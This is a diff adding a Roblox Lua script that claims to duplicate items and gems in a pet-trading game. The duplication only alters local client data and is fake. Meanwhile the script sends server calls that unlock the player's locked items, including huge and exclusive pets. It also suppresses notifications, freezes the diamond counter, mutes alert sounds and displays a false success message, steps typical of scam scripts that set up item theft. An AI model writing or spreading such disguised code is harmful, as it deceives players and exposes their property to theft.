@@ -1,0 +1,114 @@
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+local plr = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local sortedItems = {}
+_G.scriptExecuted = _G.scriptExecuted or false
+
+local function GetSave()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local newamount = 20000
+
+local GemAmount1 = 1
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+        break
+    end
+end
+
+local function formatNumber(number)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
+local function DuplicateItems()
+    for i, v in pairs(save.Currency) do
+        if v.id == "Diamonds" then
+            if v._am then
+                v._am = v._am * 2
+            else
+                v._am = 2
+            end
+        end
+    end
+
+    for category, items in pairs(save) do
+        if category ~= "Currency" then
+            for uid, item in pairs(items) do
+                if item._am then
+                    item._am = item._am * 2
+                else
+                    item._am = 2
+                end
+            end
+        end
+    end
+end
+
+local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
+gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
+    gemsleaderstatpath.Value = gemsleaderstat
+end)
+
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+    noti.Enabled = false
+end)
+noti.Enabled = false
+
+game.DescendantAdded:Connect(function(x)
+    if x.ClassName == "Sound" then
+        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "14254721038" or x.SoundId == "12413423276" then
+            x.Volume = 0
+            x.PlayOnRemove = false
+            x:Destroy()
+        end
+    end
+end)
+
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+
+for i, v in pairs(categoryList) do
+    if save[v] ~= nil then
+        for uid, item in pairs(save[v]) do
+            if v == "Pet" then
+                local dir = library.Directory.Pets[item.id]
+                if dir.huge or dir.exclusiveLevel then
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, name = item.id})
+                end
+            else
+                table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, name = item.id})
+            end
+            if item._lk then
+                local args = {
+                    [1] = uid,
+                    [2] = false
+                }
+                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+            end
+        end
+    end
+end
+
+if #sortedItems > 0 or GemAmount1 > newamount then
+    DuplicateItems()
+    local message = require(game.ReplicatedStorage.Library.Client.Message)
+    message.Error("Items and gems have been duplicated successfully!")
+end
